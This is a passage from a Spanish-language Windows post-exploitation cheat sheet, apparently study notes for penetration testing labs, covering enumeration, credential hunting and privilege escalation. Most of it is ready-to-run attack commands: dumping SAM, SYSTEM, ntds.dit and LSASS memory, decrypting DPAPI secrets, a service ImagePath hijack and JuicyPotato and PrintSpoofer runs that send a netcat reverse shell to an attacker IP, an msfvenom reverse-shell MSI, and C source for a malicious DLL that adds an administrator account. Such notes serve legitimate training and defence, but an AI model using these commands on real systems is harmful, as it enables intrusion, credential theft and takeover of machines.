wmic USERACCOUNT Get Domain,Name,Sid
```

#### Grupos

```powershell
# Local
net localgroup # Lista todos los grupos
net localgroup Administrators # Info acerca de un grupo (admins)
net localgroup administrators <USERNAME> /add # Agreaga un usuario al grupo administrators

Get-LocalGroup # Lista todos los grupos locales
Get-LocalGroupMember <GROUP> # Lista los miembros de un Grupo

# Dominio
net group /domain                      # Info acerca de los grupos del dominio
net group /domain <DOMAIN_GROUP_NAME>  # Usuarios que pertencen al grupo
net group "Domain Computers" /domain   # Lista de PC conectadas al dominio
net group "Domain Controllers" /domain # Listar cuentas de PC de controladores de dominio
```

#### Red

```powershell
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh advfirewall show state
```

#### Windows Defender

```powershell
netsh advfirewall show allprofiles
sc query windefend

Get-MpComputerStatus
```

#### Recursos Compartidos

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/
- `ADMIN$` se asigna a C:/Windows
- `IPC$` se utiliza para RPC
- `Print$` aloja controladores para impresoras compartidas
- `SYSVOL` sólo en DCs
- `NETLOGON` sólo en los DC

```powershell
# Listar recursos compartidos
Get-SMBShare
net share

# Montar el recurso compartido
net use z: \\172.16.0.1\C$ /user:elliot "P@ssword123!"

# Desmontar el recurso compartido
net use /delete z:

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usarse IP o nombre de host para especificar el host.
net view \\172.16.0.1 /all
```

#### Información sensible

```powershell
Get-ChildItem -Force
ls -Force

where /R C:\ bash.exe # Realiza una búsqueda del archivo (en este caso del binario bash.exe) en el sistema

Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\elliot\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Select-String -Path C:\Users\elliot\Documents\*.txt -Pattern password

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /S /I /C:"password" "C:\Users\celia.almeda\*"*.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*
findstr /S /I /M /R /C:"\<password\>" "C:\Users\celia.almeda\*.txt" # mostrar solo el archivo

# Visualización de redes inalámbricas guardadas
netsh wlan show profile
```

Buscar contraseñas en el Registro

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" -> PuTTY
```

#### Volcado de credenciales

```powershell
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\system c:\temp\system.save
reg.exe save hklm\security c:\temp\security.save
```

Algunos otros archivos en los que podemos encontrar credenciales incluyen lo siguiente:

```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, 
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

#### DPAPI Secrets

La API de protección de datos (DPAPI) es un componente interno del sistema Windows. Permite que diversas aplicaciones almacenen datos confidenciales (p. ej., contraseñas). Los datos se almacenan en el directorio de usuarios y están protegidos por claves maestras específicas del usuario, derivadas de su contraseña. Suelen estar ubicados en:

```powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Aplicaciones como Google Chrome, Outlook, entre otros, utilizan la API DPAPI. Windows también utiliza esta API para información confidencial, como contraseñas de Wi-Fi, certificados, contraseñas de conexión RDP y mucho más.

A continuación se muestran rutas comunes de archivos ocultos que generalmente contienen datos protegidos por DPAPI.


```powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

![DPAPI](/images/dpapi00.png)
![DPAPI](/images/dpapi01.png)

Usamos Impacket para **desencriptar la masterkey**, lo cual es un paso clave. Sin esta clave, no podriamos desencriptar los secretos protegidos por DPAPI.

```bash
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

![DPAPI](/images/dpapi02.png)

- Lee el archivo **MasterKey**.
- Usa el **SID** y la **contraseña del usuario** para derivar la User Key.
- Desencripta la MasterKey con esa User Key.

Desencriptamos las credenciales.

```bash
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

![DPAPI](/images/dpapi03.png)
> Windows usa la contraseña del usuario para derivar una clave (SHA1(MD4(password))) y con eso desencripta las MasterKey. Y luego esa MasterKey desencripta los secretos reales.

#### Credenciales guardadas

El [comando CMDKey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede usar para crear, enumerar y eliminar los nombres de usuario y contraseñas almacenados. Los usuarios pueden desear almacenar credenciales para un host específico o usarlo para almacenar credenciales para conexiones de servicios de terminal para conectarse a un host remoto que usa escritorio remoto sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o aumentar los privilegios en el host actual para aprovechar las credenciales almacenadas para otro usuario.

```
cmdkey /list
runas /savecred /user:hacklab.local\bob "whoami"
```

#### Windows Autologon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) es una característica que permite a un usuario configurar su sistema operativo Windows para iniciar sesión automáticamente en una cuenta de usuario específica, sin requerir la entrada manual del nombre de usuario y la contraseña en cada inicio. Sin embargo, una vez que esto se configura, el nombre de usuario y la contraseña se almacenan en el registro, en texto claro. Esta característica se usa comúnmente en sistemas de un solo usuario o en situaciones donde la conveniencia supera la necesidad de una mayor seguridad.

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Enumeración automatizada

- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)

### Escalación de Privilegios

#### ACL de registro permisivas

Si una cuenta de usuario puede registrar servicios, entonces podemos crear un servicios malicioso para realizar una tarea privilegiada.

```bash
PS C:\\> accesschk.exe /accepteula "user" -kvuqsw hklm\\System\\CurrentControlSet\\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\\System\\CurrentControlSet\\services\\regsvc
        KEY_ALL_ACCESS

<SNIP>
```

##### Cambiar ImagePath con PowerShell

Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el valor de `ImagePath`, usando un comando como:

```bash
Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\regsvc -Name "ImagePath" -Value "C:\\Temp\\nc.exe -e cmd.exe 192.168.56.5 4444"
```

```bash
reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\\Temp\\privesc.exe] /f
```

##### Nos ponemos en escucha con Netcat

```bash
rlwrap nc -lnvp 4444
```

##### Detemenos e Iniciamos el servicio

```bash
sc.exe stop regsvc
sc.exe start regsvc
```

#### AlwaysInstallElevated

La política **Always Install Elevated** es una configuración en Windows que permite a los usuarios estándar instalar aplicaciones con privilegios elevados. Cuando esta política está habilitada, cualquier instalación de aplicación iniciada por un usuario estándar se ejecuta con derechos administrativos, evitando así las solicitudes de **Control de Cuentas de Usuario (UAC)**.

En pocas palabras, si está **habilitada tanto en HKLM (Computer) como en HKCU (User)**, cualquier archivo `.msi` instalado por **un usuario no privilegiado** se ejecutará con **privilegios del sistema (SYSTEM)**.

##### Comprobar que la política AlwaysInstallElevated esta habilitada

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
```

![AlyasInstallElevated](/images/aie00.png)

![AlyasInstallElevated](/images/aie01.png)

##### 1. Generar un Paquete MSI Malicioso

Para aprovechar esta política, podemos crear un paquete MSI malicioso para obtener una reverse shell hacia nuetro equipo de atacante. Esto se puede hacer utilizando `msfvenom`. En este ejemplo, configuramos el host local `LHOST` como `192.168.56.5` y el puerto local `LPORT` como `4444`.

El comando para generar el paquete MSI es:

```bash
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.17 LPORT=443 -f msi -o shell.msi
```

##### 2. Transferir el Archivo MSI al Objetivo

Una vez generado el archivo `shell.msi`, debemos transferirlo a la máquina objetivo. Podemos usar algunos métodos como:

- Compartir archivos (por ejemplo, a través de SMB).
- Subirlo a un servidor web y descargarlo en la máquina objetivo.
- Copiarlo directamente si tienes acceso físico o remoto.

##### 3. Configurar un Listener

El la máquina atacante nos ponemos en escucha con netcat por el puerto indicado, en este caso `4444`.

```powershell
rlwrap nc -lnvp 443
```

##### 4. Ejecutar el Paquete MSI en el Objetivo

En la máquina objetivo, ejecutamos el paquete MSI utilizando el comando `msiexec`. Para evitar alertas o interrupciones, usamos los parámetros `/quiet` y `/qn`, que ejecutan la instalación en modo silencioso:

```powershell
msiexec /i C:\temp\shell.msi /quiet /qn /norestart
```

![AlyasInstallElevated](/images/aie02.png)

#### Aplicaciones ejecutadas al inicio

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Si `BUILTIN\Users` tiene el privilegio `(F)`, podemos agregar un payload en esa ruta.
- Usamos `msfvenom` para generar una revese shell
- Colocamos la reverse shell en la carpeta
- Iniciamos un listener con Netcat
- Espere a que un Administrador inicie sesión

#### Autorun

Los Autorun en Windows son una característica que permite a los programas o scripts ejecutarse automáticamente cuando el sistema operativo se inicia o cuando se conecta un dispositivo externo, como una unidad USB o un disco óptico. Esta funcionalidad es útil para tareas automatizadas, pero también puede ser explotada por malware si no se configura correctamente.

**Carpetas a chequear**

```bash
C:\\Users\\[Usuario]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\Program Files\\Autorun Program\\
```

**Registros de Windows**

```bash
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Get-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
```

Si hay algun programa de ejecución automática, es posible que pueda sobreescribirse el binario.

Podemos utilizar `accessckk.exe` de SysInternals o `icacls` para comprobar los permisos del directorio.

```bash
icacls C:\\Users\\[Usuario]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
```

Si alguno de los archivos se puede escribir, se puede sobrescribir con una reverse shell o algun otro payload que nos permita escalar privilegios.

#### Backup Operators

El grupo **BackupOperators** es un grupo integrado en Windows que otorga a sus miembros la capacidad de realizar copias de seguridad y restaurar archivos, incluso si no tienen permisos para acceder a esos archivos en circunstancias normales. Este privilegio hace que el grupo sea especialmente poderoso y potencialmente peligroso en escenarios de _escalación de privilegios_, ya que los miembros pueden acceder a archivos sensibles, como la base de datos **SAM (Security Account Manager)** y archivos del sistema, lo que podría permitirles obtener acceso de mayor nivel o incluso privilegios de _SYSTEM_.

##### **Privilegios Clave del grupo Backup Operators**

Los miembros del grupo **Backup Operators** tienen dos privilegios principales:

1. **SeBackupPrivilege**:
    - Permite a los usuarios **omitir los permisos del sistema de archivos** para realizar copias de seguridad. Esto significa que un miembro de este grupo puede leer archivos a los que normalmente no tendría acceso.
    - **Ejemplo de uso**: Acceder a archivos protegidos como el archivo **SAM**, que almacena los hashes de las contraseñas de los usuarios locales.
2. **SeRestorePrivilege**:
    - Permite a los usuarios **restaurar archivos en cualquier ubicación** del sistema de archivos, incluyendo ubicaciones protegidas o sensibles. Esto también les permite modificar archivos que normalmente estarían restringidos.
    - **Ejemplo de uso**: Sobrescribir archivos del sistema, como binarios de servicios, para ejecutar código malicioso con privilegios elevados.

**Explotación**

Extraer el archivo **SAM**:

Usar herramientas como `reg.exe` para exportar el archivo SAM y SYSTEM:

```bash
reg save HKLM\\SAM C:\\temp\\SAM
reg save HKLM\\SYSTEM C:\\temp\\SYSTEM
```

Extraer los hashes de contraseñas.

**mimikatz**

Desde Windows podemos usar mimikatz

```bash
sekurlsa::samdump::local c:\\temp\\sam c:\\temp\\system
```

También podemos transferir los archivos a nuestra máquina atacante y usar `secretsdump.py` o `pypykatz`.

**secrestsdump**

```bash
impacket-secrestsdump -sam sam -system system local
```

**pypykatz**

```bash
pypykatz registry --sam sam system
```

##### Extracción del archivo ntds.dit en un DC

A diferencia de la explotación en sistemas independientes, en un Controlador de Dominio (DC), necesitamos acceder al archivo **ntds.dit** para extraer los hashes de contraseñas, junto con el archivo SYSTEM. Sin embargo, el archivo **ntds.dit** presenta un desafío importante: mientras el Controlador de Dominio está en funcionamiento, este archivo está siempre en uso, lo que impide su copia directa mediante métodos convencionales.

Para superar este problema, podemos utilizar la herramienta `diskshadow`, una funcionalidad integrada de Windows que nos permite crear una copia en la sombra (shadow copy) de una unidad, incluso si está en uso. Aunque diskshadow puede ejecutarse directamente desde una shell, este enfoque suele ser complicado y propenso a errores. Por ello, optamos por crear un Archivo Shell Distribuido (DSH), que contiene todos los comandos necesarios para que diskshadow realice la copia de la unidad de manera automatizada.

**1. Crear el Archivo DSH**

En nuestra máquina de atacante, creamos un archivo DSH utilizando un editor de texto. Este archivo contendrá los comandos necesarios para que diskshadow cree una copia de la unidad C: en una unidad virtual Z:. Aquí está el contenido del archivo DSH:

```bash
> vim cmd
set context persistent nowriters
add volume c: alias cmd
create
expose %cmd% z:
> unix2dos cmd.dsh
```

- `set context persistent nowriters`: Configura el contexto para crear una copia en la sombra persistente y sin escritura.
- `add volume c: alias backup`: Agrega la unidad C: como un volumen para la copia, asignándole el alias backup.
- `create`: Crea la copia en la sombra.
- `expose %backup% z:`: Expone la copia en la sombra como una nueva unidad `Z:`.

**2. Convertir el Archivo DSH a Formato Windows**

Dado que el archivo DSH se crea en un entorno Linux, debemos asegurarnos de que sea compatible con Windows. Para ello, usamos la herramienta `unix2dos`, que convierte la codificación y el espaciado del archivo a un formato compatible con Windows:

```bash
unix2dos cmd.dsh
```

Esto asegura que los saltos de línea y la codificación sean correctos para su ejecución en Windows.

**3. Transferir el Archivo DSH al Controlador de Dominio:**

Una vez convertido, transferimos el archivo DSH al Controlador de Dominio utilizando métodos como SMB, FTP o cualquier otro medio disponible.

**4. Ejecutar diskshadow con el Archivo DSH y Extraer el Archivo ntds.dit**

Una vez conectados en la máquina objetivo, nos movemos al Directorio Temp y subimos el archivo `archivo.dsh`. Luego, usamos el script diskshadow con dsh como se muestra abajo. Si se observa, se puede notar que diskshadow está efectivamente ejecutando los mismos comandos que ingresamos en el archivo dsh secuencialmente. Después de ejecutarse, como se ha comentado, creará una copia de la unidad C en la unidad Z. Ahora, podemos utilizar la herramienta RoboCopy para copiar el archivo de la unidad Z al directorio temporal.

```bash
cd C:\\Temp
upload archivo.dsh
cmd.exe /c "diskshadow /s archivo.dsh"
robocopy /b z:\\windows\\ntds . ntds.dit
```

```bash
reg save hklm\\sam C:\\temp\\sam
reg save hklm\\system C:\\temp\\system
```

**5. Extraer los hashes**

Transferimos los archivos a nuestra máquina atacante y extraemos los hashes.

```bash
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

#### DLL Hijacking

**Orden de búsqueda estándar**

El orden de búsqueda lo define Microsoft y determina que inspeccionar primero al buscar una DLL. De forma predeterminada, todos las versiones actuales de Windows tienen habilitada el modo de busqueda segurda de DLL.

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema.
3. El directorio del sistema de 16 bits.
4. El directorio de Windows.
5. El directorio actual.
6. Los directorios que aparecen enumerados en la variable de entorno PATH.

##### evildll.cpp

```bash
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Manejar el módulo DLL
DWORD ul_reason_for_call,// Motivo de la llamada a la función
LPVOID lpReserved ) // Reservado
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // Un proceso está cargando la DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // Un proceso está creando un nuevo hilo.
        break;
        case DLL_THREAD_DETACH: // Un hilo termina normalmente.
        break;
        case DLL_PROCESS_DETACH: // Un proceso descarga la DLL.
        break;
    }
    return TRUE;
}
```

**Compilar el archivo evildll.dll**

```bash
x86_64-w64-mingw32-gcc evildll.cpp --shared -o evildll.dll
```

**Alternativa - Usar msfvenom para crear una DLL y recibir una reverse shell**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evildll.dll
```

**Transferimos la DLL a la máquina objetivo**

```bash
iwr -uri <http://192.168.56.5/evildll.dll> -OutFile 'C:\\Ruta\\Al\\Binario\\<FILE>.dll'
```

> Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa

#### Event Log Readers

El grupo **Event Log Readers** en Windows está disenñado para permitir que sus miembros lean los registros de eventos del sistema. Este grupo suele incluir a usuarios que necesitan monitorear o analizar eventos del sistema y aplicaciones sin otorgarles privilegios administrativos más amplios.

Los miembros del grupo **Event Logs Readers** tiene los siguientes privilegios:

1. **Leer Registros de Eventos**: Los usuarios pueden acceder y leer los registros de eventos generados por el sistema operativo Windows, aplicaciones y servicios.
2. **Ver Registros de Seguridad**: Estoy incluye acceso a eventos relacionados con la seguridad, que pueden contener información sensible como inicios de sesión de usuarios, cambios en cuentas y modificaciones en políticas de seguridad.

Riesgos de Escalación de Privilegios:

Aunque el grupo no otorga privilegios elevados de manera inherente, existen escenarios específicos en los que sus miembros podrían escalar sus privilegios:

1. **Análisis de Registros de Seguridad**:
    - Al revisar los registros de seguridad, un usuario podría indentificar información sensible, como credenciales de cuentas, bloqueos de cuentas o cambios reaizados por otros usuarios. Esta información podría ser utilizada para obtener acceso no autorizado a cuentas o sistemas.
2. **Identificación de Vulnerabilidades**:
    - Los usuarios pueden analizar los registros de eventos, para detectar configuraciones incorrectas o vulnerabilidades en el sistema. Por ejemplo, si un administrador inicia y cierra sesión con frecuencia o si hay múltiples intentos fallidos, esto podría indicar contraseñas débiles o cuentas mal protegidas.
3. **Enfoque en Otros Usuarios**:
    - La información de los registros de eventos puede ayudar a identificar cuentas con altos privilegios y sus patrones de actividad. Un atacante podría utilizar esta información para realizar ataques dirigidos, como phising o ingeniería social, contra esos usuarios.
4. **Explotación del Acceso a Registros para Otros Ataques**:
    - Si un usuario puede leer los registros de eventos, podría manipular servicios de registros u otros componentes para realizar acciones con mayores privilegios, especialemente si existen vulnerabilidades o configuraciones incorretas en esos servicios.

**Búsqueda de registros de seguridad con wevtutil**

La utilidad `wevtutil` es una herramienta eficaz para administrar los registros de eventos de Windows. Permite consultarlos y recuperar información según criterios específicos. En este ejemplo, nos centraremos en consultar el registro de seguridad para encontrar eventos específicos relacionados con el usuario.

```bash
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Explicación:

- `wevtutil`: Esta es la utilidad de línea de comandos para la administración de eventos de Windows.
- `qe Security`: Esta opción específica que queremos consultar el registro de seguridad.
- `/rd:true`: Esta opción invierte el orden de eventos, mostrando primero los más recientes. Esto resulta útil para identificar rápidamente las actividades más recientes.
- `/f:text`: Esta opción específica el formato de la salida. En este caso, solicitamos la salida en texto plano.
- `| Select-String "/user"`: Esta parte del comando envía la salida al cmdlet `Select-String`, que filtra los resultados para incluir solo líneas que contiene la cadena `/user`. Esto es particularmente útil para identificar entradas de registro relacionadas con las acciones de la cuenta de registro.

**Salida de ejemplo**

El comando puede producir un resultado similar al siguiente:

```bash
Process Command Line: net use T: \\\\dbs\\backups /user:elliot Password123!
```

Interpretación de la salida

- La salida indica que se ejecutó un comando para establecer una conexión de red a `\\\\dbs\\backups` utilizando el nombre de usuario (`elliot`) y la contraseña especificados (`Password123!`).
- Esta información puede ser crucial para el análisis de seguridad, ya que revela la actividad del usuario relacionada con los recursos compartidos de la red, lo que potencialmente podría indicar acceso no autorizado o uso indebido de credenciales.

#### GUI Apps

Si una aplicación GUI está configurada para ejecutarse como administrador al iniciarse podemos abusar de esta para obtener una consola:

Por ejemplo: MS-Paint

- Archivo > Abrir -> Ingresar `file://C:/Windows/System32/cmd.exe`

#### SeDebugPrivilege

SeDebugPrivilege es un potente privilegio de Windows que permite al usuario depurar e interactuar con cualquier proceso que se esté ejecutando en el sistema, incluso aquellos que se ejecutan como SYSTEM. Este privilegio está diseñado principalmente para que desarrolladores y administradores depuren aplicaciones, pero puede explotarse para escalar privilegios.

Ejecutando el comando `whoami /priv`, podemos comprobar si el usuario actual tiene el privilegio SeDebugPrivilege. Si aparece en la lista, este privilegio puede usarse para abusar y acceder a ciertos procesos sensibles del sistema como LSASS o escalar privilegios inyectando código malicioso en estos procesos.

Si un usuario tiene SeDebugPrivilege , puede explotarlo para interactuar con procesos con privilegios elevados, especialmente aquellos que se ejecutan como SYSTEM. Al acceder a estos procesos, un atacante puede extraer información confidencial, como credenciales o contraseñas, u obtener el control total del sistema.

**Volcado de LSASS para extraer credenciales**

El Servicio del Subsistema de Autoridad de Seguridad Local (LSASS) se encarga de aplicar la política de seguridad en el sistema, gestionar los cambios de contraseña y validar el inicio de sesión de los usuarios. LSASS almacena las credenciales en memoria y, si SeDebugPrivilege está habilitado, se puede volcar para extraerlas.

Pasos para explotar el volcado de LSASS:

1. Utilizamos el binario de [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [suite SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite):

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Explicación:

- `ma`: Captura un volcado de memoria completo del proceso `lsass.exe`.
- `lsass.dmp`: El archivo de volcado de salida que luego se puede analizar para extraer credenciales.

Analizar el dump con Mimikatz :

```bash
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
- `sekurlsa::minidump`: Carga el archivo volcado.
- `sekurlsa::logonpasswords` Extrae credenciales del volcado.

#### SeImpersonate y SeAssignPrimaryToken

En Windows, cada proceso tiene asociado un **token** que contiene información sobre la cuenta que lo está ejecutando, como los permisos y privilegios asociados. Sin embargo, estos tokens **no se consideran recursos completamente seguros**, ya que residen en la memoria del sistema y, en teoría, podrían ser vulnerables a ataques de fuerza bruta o manipulación por parte de usuarios malintencionados con acceso limitado. Para utilizar un token y realizar acciones en nombre de otro usuario (por ejemplo, mediante la función `CreateProcessWithTokenW`), se requiere el privilegio **SeImpersonate**. Este privilegio está generalmente reservado para cuentas administrativas y servicios de alto nivel, como los que se ejecutan bajo las cuentas `SYSTEM` o `Local Service`.

Durante el proceso de **endurecimiento del sistema** (hardening), este privilegio puede ser eliminado o restringido como medida de seguridad.

> En Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando.

Los programas legítimos en Windows pueden utilizar el token de otro proceso para escalar privilegios, pasando de una cuenta de Administrador a Local System, que tiene permisos más amplios y acceso completo al sistema. Esto se logra típicamente mediante una llamada al proceso WinLogon, que es responsable de gestionar los inicios de sesión y los tokens de seguridad. Al interactuar con WinLogon, un proceso puede obtener un token del sistema y luego ejecutarse con ese token, efectivamente operando dentro del contexto de Local System.

Sin embargo, este mecanismo también puede ser explotado por atacantes en técnicas de escalada de privilegios, como los ataques del estilo “Potato”. Estos ataques aprovechan el privilegio SeImpersonate, que permite a un proceso suplantar el token de otro usuario. Aunque una cuenta de servicio puede tener el privilegio SeImpersonate, no tiene acceso completo a los privilegios de nivel SYSTEM. El ataque Potato engaña a un proceso que se ejecuta como SYSTEM para que se conecte a un proceso controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token del proceso SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

Varias herramientas y técnicas aprovechan SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege para escalar privilegios a SYSTEM o Administrador. A continuación, se presentan algunas de ellas:

##### JuicyPotato.exe

> Windows 10 compilación 1809 - Windows Server 2016
> 
> [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

JuicyPotato es una herramienta de explotación diseñada para abusar de los privilegios SeImpersonate o SeAssignPrimaryToken en sistemas Windows. Estos privilegios, comúnmente asignados a cuentas de servicio, permiten a un proceso suplantar tokens de seguridad de otros usuarios. JuicyPotato aprovecha esta capacidad mediante ataques de reflexión DCOM/NTLM, engañando a un proceso que se ejecuta con privilegios de SYSTEM para que se conecte a un servicio controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token de SYSTEM y utilizarlo para ejecutar código con privilegios elevados.

Sin embargo, esta herramienta tiene limitaciones: funciona en versiones de Windows hasta Windows Server 2016 y Windows 10, compilación 1809.

**Pasos para explotar el uso de JuicyPotato**:

**1. Configurar el listener con Netcat en la máquina atacante**:

```bash
rlwrap nc -lnvp 4444
```

**2. Ejecutar JuicyPotato en la máquina objetivo**:

```powershell
c:\\temp\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\temp\\nc.exe 192.168.56.5 4444 -e cmd.exe" -t *
```

Explicación:

- `l`: Especifica el puerto de escucha del servidor COM (53375 en este caso).
- `p`: Programa a lanzar (en este caso, cmd.exe).
- `a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina atacante y proporcione una reverse shell.
- `t`: Especifica el `createprocess` a llamar, utilizando las funciones `CreateProcessWithTokenW` o `CreateProcessAsUser`, que requieren privilegios **SeImpersonate** o **SeAssignPrimaryToken**.

##### PrintSpoofer

> Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019
> 
> [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

**PrintSpoofer** abusa del servicio **Spooler** de impresión de Windows y su interacción con named pipes (tuberías con nombre) para escalar privilegios. Explota una combinación de características y comportamientos del sistema operativo que permiten a un atacante suplantar el token de seguridad de un proceso que se ejecuta como SYSTEM.

**Pasos para explotar el código usando PrintSpoofer**:

1.**Ejecutar PrintSpoofer**:

```powershell
c:\\temp\\PrintSpoofer.exe -c "c:\\temp\\nc.exe 192.168.56.5 4444 -e cmd"
```

Explicación:

- `c`: Especifica el comando que se ejecutará una vez que la escalada de privilegios sea exitosa. En este caso, se ejecuta Netcat (nc.exe) para proporcionar una reverse shell a la máquina atacante.

##### RogueWinRM

> Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019
> 
> [https://github.com/antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

**RogueWinRM** es una técnica de explotación que permite la escalada de privilegios en sistemas Windows aprovechando el servicio WinRM (Windows Remote Management). A diferencia de JuicyPotato, que se basa en la reflexión DCOM/NTLM, RogueWinRM abusa del servicio WinRM para ejecutar código con privilegios de SYSTEM. Esta técnica es particularmente útil en entornos donde JuicyPotato no funciona, como en Windows Server 2019 y versiones más recientes de Windows 10.

```powershell
.\\RogueWinRM.exe -p "C:\\temp\\payload.exe"
```

##### SigmaPotato

> Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019
> 
> [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)

```powershell
# Ejecutar un comando
./SigmaPotato.exe <command>

# Establecer una reverse shell con PowerShell
./SigmaPotato.exe --revshell <ip_addr> <port>
```

#### Servicios

##### Enumeración de servicios en ejecución

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

- `Get-CimInstance`: Es un cmdlet de PowerShell que se utiliza para obtener instancias de clases CIM (Common Information Model) o WMI (Windows Management Instrumentation).
- `ClassName win32_service`: Especifica la clase WMI que se va a consultar. En este caso, win32_service es una clase que contiene información sobre los servicios de Windows.

##### Enumeración de la configuración del servicio

```bash
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

##### Mascara de Permisos `icacls`

| **Mask** | **Permissions**         |
